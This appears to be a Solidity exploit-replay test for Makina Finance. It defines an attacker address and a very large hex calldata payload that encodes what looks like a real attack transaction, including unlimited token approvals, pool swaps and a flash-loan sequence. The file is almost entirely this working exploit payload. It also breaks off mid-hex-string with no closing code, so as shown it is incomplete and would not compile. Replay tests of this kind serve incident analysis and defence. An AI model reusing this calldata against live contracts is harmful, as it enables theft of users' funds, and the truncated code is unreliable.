// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./Makina_FinanceBase.sol";

contract ReplayTest is Makina_FinanceBase {
    address constant ATTACKER_ADDR = 0x935bfb495E33f74d2E9735DF1DA66acE442ede48;
    address constant TARGET_ADDR = 0x935bfb495E33f74d2E9735DF1DA66acE442ede48;
    bytes constant INPUT_DATA = hex"34030d9e00009363aa1aa922000000000000000000000000000000000000000000000044a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800095ea7b300000000000000000000000032e616f4f17d43f9a5cd9be0e294727187064cb3ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0044a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800095ea7b3000000000000000000000000bebc44782c7db0a1a60cb6fe97d0b483032ff1c7ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00446c3f90f043a72fa612cbac8115ee7e52bde6e49000095ea7b30000000000000000000000005a6a4d54456819380173272a5e8e9b9904bdf41bffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00441e33e98af620f1d563fcd3cfd3c75ace841204ef00095ea7b300000000000000000000000032e616f4f17d43f9a5cd9be0e294727187064cb3ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff004499d8a9c45b2eca8864373a26d1459e3dff1e17f300095ea7b30000000000000000000000005a6a4d54456819380173272a5e8e9b9904bdf41bffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00446c3f90f043a72fa612cbac8115ee7e52bde6e49000095ea7b3000000000000000000000000bebc44782c7db0a1a60cb6fe97d0b483032ff1c7ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0044a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800095ea7b300000000000000000000000087870bca3f3fd6335c3f4ce8392d69350b4fa4e2ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0044a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800095ea7b3000000000000000000000000bbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcbffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff07e4bbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcb00e0232b42000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000920e7cc2f874000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000007449341a475000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000f819a666d560f6ce6f065fe9be046950000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000001f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000062000000000000000000000000000000000000000000000000000000000000000030000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000000000000000000000000000000000000000000b70a082310104ff0000000004fd5abf66b003881b88567eb9ed9c651f14dc47716d5433e6010406ff00000004836c9007dbd73fcfc473190304c72b7e39babb91cc2b27d7810406ff000000845a6a4d54456819380173272a5e8e9b9904bdf41b62de91e9018405ff000000046e2ed2f457c41f38556ab0c2b1185cc9e6563d8d18160ddd01ff0000000000086c3f90f043a72fa612cbac8115ee7e52bde6e4904903b0d10105ff0000000005bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10106ff0000000006bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10107ff0000000007bebc44782c7db0a1a60cb6fe97d0b483032ff1c7aa9a091201050408ff000000836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201060408ff000001836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201070408ff000002836c9007dbd73fcfc473190304c72b7e39babb910000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000240000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000002c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007a7a3f0f3dbca12895d1f9424e8d0a924d50c92edfec3f817082763f73cb4cd5af326b46750aa6deec7344bb6f7243a395bcfde2680300e16f1bbff78672cbf3c8c6626860a4b2368ed8caf9fd5b14b90d151c3ca390b7aff38dfe7003b5d421d166be3838e86d1af766aeb93493d81b89e564c96c2f8decb94b400912de6afedede17ea0feb39c3e2c3b900b4a95f239f010c251afb46a89984d868151c5b209bf97f0d554ad3b05a210efb4de2a4930747e423e87b1fb139b63fcc94f17e286ae44b282d93e68621a7e6efa1e9b9893cc74b52a65196a60693a9e325c0fc401000000000000000000000000000000000000000000000000000000000000a92785bebbb148ae23ca177538981deae91c7d09000044a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800095ea7b3000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0024a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480170a08231000000000000000000000000935bfb495e33f74d2e9735df1da66ace442ede4800000000000000000000000000000000000000000000050104e592427a0aece92de3edee1f18e0157c0586156410414bf389000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000bb8000000000000000000000000935bfb495e33f74d2e9735df1da66ace442ede48ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a40044a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800095ea7b3000000000000000000000000e592427a0aece92de3edee1f18e0157c0586156400000000000000000000000000000000000000000000000000000000000000010024c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20170a08231000000000000000000000000935bfb495e33f74d2e9735df1da66ace442ede4800000000000000000000000000000000000000000000050024c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2102e1a7d4d0000000000000000000000000000000000000000000000000000000000000000000456d608ba2b92394343724c2a634cce5c4becd239c88bd2f24986f1befe2eca350000083b082487870bca3f3fd6335c3f4ce8392d69350b4fa4e20042b0b77c000000000000000000000000935bfb495e33f74d2e9735df1da66ace442ede48000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000006c9a17c6878c00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007449341a475000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000f819a666d560f6ce6f065fe9be046950000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000001f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000062000000000000000000000000000000000000000000000000000000000000000030000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000000000000000000000000000000000000000000b70a082310104ff0000000004fd5abf66b003881b88567eb9ed9c651f14dc47716d5433e6010406ff00000004836c9007dbd73fcfc473190304c72b7e39babb91cc2b27d7810406ff000000845a6a4d54456819380173272a5e8e9b9904bdf41b62de91e9018405ff000000046e2ed2f457c41f38556ab0c2b1185cc9e6563d8d18160ddd01ff0000000000086c3f90f043a72fa612cbac8115ee7e52bde6e4904903b0d10105ff0000000005bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10106ff0000000006bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10107ff0000000007bebc44782c7db0a1a60cb6fe97d0b483032ff1c7aa9a091201050408ff000000836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201060408ff000001836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201070408ff000002836c9007dbd73fcfc473190304c72b7e39babb910000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000240000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000002c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007a7a3f0f3dbca12895d1f9424e8d0a924d50c92edfec3f817082763f73cb4cd5af326b46750aa6deec7344bb6f7243a395bcfde2680300e16f1bbff78672cbf3c8c6626860a4b2368ed8caf9fd5b14b90d151c3ca390b7aff38dfe7003b5d421d166be3838e86d1af766aeb93493d81b89e564c96c2f8decb94b400912de6afedede17ea0feb39c3e2c3b900b4a95f239f010c251afb46a89984d868151c5b209bf97f0d554ad3b05a210efb4de2a4930747e423e87b1fb139b63fcc94f17e286ae44b282d93e68621a7e6efa1e9b9893cc74b52a65196a60693a9e325c0fc4010000000000000000000000000000000000000000000000000000000008600b0f05611453de1694798ea2c7fca5c4835e154a0baa96c2b45b872930b200202b6000a432e616f4f17d43f9a5cd9be0e294727187064cb300b72df5de00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000005af3107a40000000000000000000000000000000000000000000000000000000000000000000008432e616f4f17d43f9a5cd9be0e294727187064cb3003df0212400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000009184e72a00000000000000000000000000000000000000000000000000000000000000000000084bebc44782c7db0a1a60cb6fe97d0b483032ff1c7004515cef3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009a9d359ca0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000645a6a4d54456819380173272a5e8e9b9904bdf41b000b4c7e4d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000018d0bf423c03d8de000000000000000000000000000000000000000000000000000000000000000000000000645a6a4d54456819380173272a5e8e9b9904bdf41b001a4d01d20000000000000000000000000000000000000000000c685fa11e01ec6f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000845a6a4d54456819380173272a5e8e9b9904bdf41b003df02124000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006342fd08f00f637800000000000000000000000000000000000000000000000000000000000000000000000744d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc009341a475000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000f819a666d560f6ce6f065fe9be046950000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000001f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000062000000000000000000000000000000000000000000000000000000000000000030000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000000000000000000000000000000000000000000b70a082310104ff0000000004fd5abf66b003881b88567eb9ed9c651f14dc47716d5433e6010406ff00000004836c9007dbd73fcfc473190304c72b7e39babb91cc2b27d7810406ff000000845a6a4d54456819380173272a5e8e9b9904bdf41b62de91e9018405ff000000046e2ed2f457c41f38556ab0c2b1185cc9e6563d8d18160ddd01ff0000000000086c3f90f043a72fa612cbac8115ee7e52bde6e4904903b0d10105ff0000000005bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10106ff0000000006bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10107ff0000000007bebc44782c7db0a1a60cb6fe97d0b483032ff1c7aa9a091201050408ff000000836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201060408ff000001836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201070408ff000002836c9007dbd73fcfc473190304c72b7e39babb910000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000240000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000002c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007a7a3f0f3dbca12895d1f9424e8d0a924d50c92edfec3f817082763f73cb4cd5af326b46750aa6deec7344bb6f7243a395bcfde2680300e16f1bbff78672cbf3c8c6626860a4b2368ed8caf9fd5b14b90d151c3ca390b7aff38dfe7003b5d421d166be3838e86d1af766aeb93493d81b89e564c96c2f8decb94b400912de6afedede17ea0feb39c3e2c3b900b4a95f239f010c251afb46a89984d868151c5b209bf97f0d554ad3b05a210efb4de2a4930747e423e87b1fb139b63fcc94f17e286ae44b282d93e68621a7e6efa1e9b9893cc74b52a65196a60693a9e325c0fc40100046b006870c83b1cd49e766ac9209f8d68763df721004ebd0b94008432e616f4f17d43f9a5cd9be0e294727187064cb3003df0212400000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000079f6693ff4da452bd753a0000000000000000000000000000000000000000000000000000000000000000006432e616f4f17d43f9a5cd9be0e294727187064cb3001a4d01d2000000000000000000000000000000000000000000520fd72f1bb83fb1f46ad70000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000845a6a4d54456819380173272a5e8e9b9904bdf41b003df02124000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000007fe0c8cd3a1d4b73fb7000000000000000000000000000000000000000000000000000000000000000000645a6a4d54456819380173272a5e8e9b9904bdf41b001a4d01d20000000000000000000000000000000000000000000cf07c487de26ab7b27b150000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000845a6a4d54456819380173272a5e8e9b9904bdf41b003df02124000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000ae370c11ce63df6d3882800000000000000000000000000000000000000000000000000000000000000000064bebc44782c7db0a1a60cb6fe97d0b483032ff1c7001a4d01d200000000000000000000000000000000000000000086e4882e322b708aaa16fb000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000744d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc009341a475000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000f819a666d560f6ce6f065fe9be046950000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000001f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000062000000000000000000000000000000000000000000000000000000000000000030000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000000000000000000000000000000000000000000b70a082310104ff0000000004fd5abf66b003881b88567eb9ed9c651f14dc47716d5433e6010406ff00000004836c9007dbd73fcfc473190304c72b7e39babb91cc2b27d7810406ff000000845a6a4d54456819380173272a5e8e9b9904bdf41b62de91e9018405ff000000046e2ed2f457c41f38556ab0c2b1185cc9e6563d8d18160ddd01ff0000000000086c3f90f043a72fa612cbac8115ee7e52bde6e4904903b0d10105ff0000000005bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10106ff0000000006bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10107ff0000000007bebc44782c7db0a1a60cb6fe97d0b483032ff1c7aa9a091201050408ff000000836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201060408ff000001836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201070408ff000002836c9007dbd73fcfc473190304c72b7e39babb910000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000240000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000002c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007a7a3f0f3dbca12895d1f9424e8d0a924d50c92edfec3f817082763f73cb4cd5af326b46750aa6deec7344bb6f7243a395bcfde2680300e16f1bbff78672cbf3c8c6626860a4b2368ed8caf9fd5b14b90d151c3ca390b7aff38dfe7003b5d421d166be3838e86d1af766aeb93493d81b89e564c96c2f8decb94b400912de6afedede17ea0feb39c3e2c3b900b4a95f239f010c251afb46a89984d868151c5b209bf97f0d554ad3b05a210efb4de2a4930747e423e87b1fb139b63fcc94f17e286ae44b282d93e68621a7e6efa1e9b9893cc74b52a65196a60693a9e325c0fc40100046b006870c83b1cd49e766ac9209f8d68763df721004ebd0b9400a432e616f4f17d43f9a5cd9be0e294727187064cb300b72df5de00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000005af3107a40000000000000000000000000000000000000000000000000000000000000000000008432e616f4f17d43f9a5cd9be0e294727187064cb3003df0212400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000009184e72a00000000000000000000000000000000000000000000000000000000000000000000084bebc44782c7db0a1a60cb6fe97d0b483032ff1c7004515cef3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009a9d359ca0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000645a6a4d54456819380173272a5e8e9b9904bdf41b000b4c7e4d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000018d0bf423c03d8de000000000000000000000000000000000000000000000000000000000000000000000000645a6a4d54456819380173272a5e8e9b9904bdf41b001a4d01d20000000000000000000000000000000000000000000c685fa11e01ec6f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000845a6a4d54456819380173272a5e8e9b9904bdf41b003df02124000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006342fd08f00f637800000000000000000000000000000000000000000000000000000000000000000000000744d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc009341a475000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000f819a666d560f6ce6f065fe9be046950000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000001f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000062000000000000000000000000000000000000000000000000000000000000000030000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000000000000000000000000000000000000000000b70a082310104ff0000000004fd5abf66b003881b88567eb9ed9c651f14dc47716d5433e6010406ff00000004836c9007dbd73fcfc473190304c72b7e39babb91cc2b27d7810406ff000000845a6a4d54456819380173272a5e8e9b9904bdf41b62de91e9018405ff000000046e2ed2f457c41f38556ab0c2b1185cc9e6563d8d18160ddd01ff0000000000086c3f90f043a72fa612cbac8115ee7e52bde6e4904903b0d10105ff0000000005bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10106ff0000000006bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10107ff0000000007bebc44782c7db0a1a60cb6fe97d0b483032ff1c7aa9a091201050408ff000000836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201060408ff000001836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201070408ff000002836c9007dbd73fcfc473190304c72b7e39babb910000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000240000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000002c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007a7a3f0f3dbca12895d1f9424e8d0a924d50c92edfec3f817082763f73cb4cd5af326b46750aa6deec7344bb6f7243a395bcfde2680300e16f1bbff78672cbf3c8c6626860a4b2368ed8caf9fd5b14b90d151c3ca390b7aff38dfe7003b5d421d166be3838e86d1af766aeb93493d81b89e564c96c2f8decb94b400912de6afedede17ea0feb39c3e2c3b900b4a95f239f010c251afb46a89984d868151c5b209bf97f0d554ad3b05a210efb4de2a4930747e423e87b1fb139b63fcc94f17e286ae44b282d93e68621a7e6efa1e9b9893cc74b52a65196a60693a9e325c0fc40100046b006870c83b1cd49e766ac9209f8d68763df721004ebd0b94008432e616f4f17d43f9a5cd9be0e294727187064cb3003df021240000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007a3aeb9833c35d08699c30000000000000000000000000000000000000000000000000000000000000000006432e616f4f17d43f9a5cd9be0e294727187064cb3001a4d01d200000000000000000000000000000000000000000067ce8b2427276a3c4b3fae0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000845a6a4d54456819380173272a5e8e9b9904bdf41b003df0212400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000719131496eb1487d2a1000000000000000000000000000000000000000000000000000000000000000000645a6a4d54456819380173272a5e8e9b9904bdf41b001a4d01d20000000000000000000000000000000000000000000c802c6437a7fcc75e75bb0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000845a6a4d54456819380173272a5e8e9b9904bdf41b003df02124000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000ae3b7149961d5598218ad00000000000000000000000000000000000000000000000000000000000000000064bebc44782c7db0a1a60cb6fe97d0b483032ff1c7001a4d01d200000000000000000000000000000000000000000086e97de94440e4b4f9282c000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000744d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc009341a475000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000f819a666d560f6ce6f065fe9be046950000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000001f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000062000000000000000000000000000000000000000000000000000000000000000030000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000000000000000000000000000000000000000000b70a082310104ff0000000004fd5abf66b003881b88567eb9ed9c651f14dc47716d5433e6010406ff00000004836c9007dbd73fcfc473190304c72b7e39babb91cc2b27d7810406ff000000845a6a4d54456819380173272a5e8e9b9904bdf41b62de91e9018405ff000000046e2ed2f457c41f38556ab0c2b1185cc9e6563d8d18160ddd01ff0000000000086c3f90f043a72fa612cbac8115ee7e52bde6e4904903b0d10105ff0000000005bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10106ff0000000006bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10107ff0000000007bebc44782c7db0a1a60cb6fe97d0b483032ff1c7aa9a091201050408ff000000836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201060408ff000001836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201070408ff000002836c9007dbd73fcfc473190304c72b7e39babb910000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000240000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000002c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007a7a3f0f3dbca12895d1f9424e8d0a924d50c92edfec3f817082763f73cb4cd5af326b46750aa6deec7344bb6f7243a395bcfde2680300e16f1bbff78672cbf3c8c6626860a4b2368ed8caf9fd5b14b90d151c3ca390b7aff38dfe7003b5d421d166be3838e86d1af766aeb93493d81b89e564c96c2f8decb9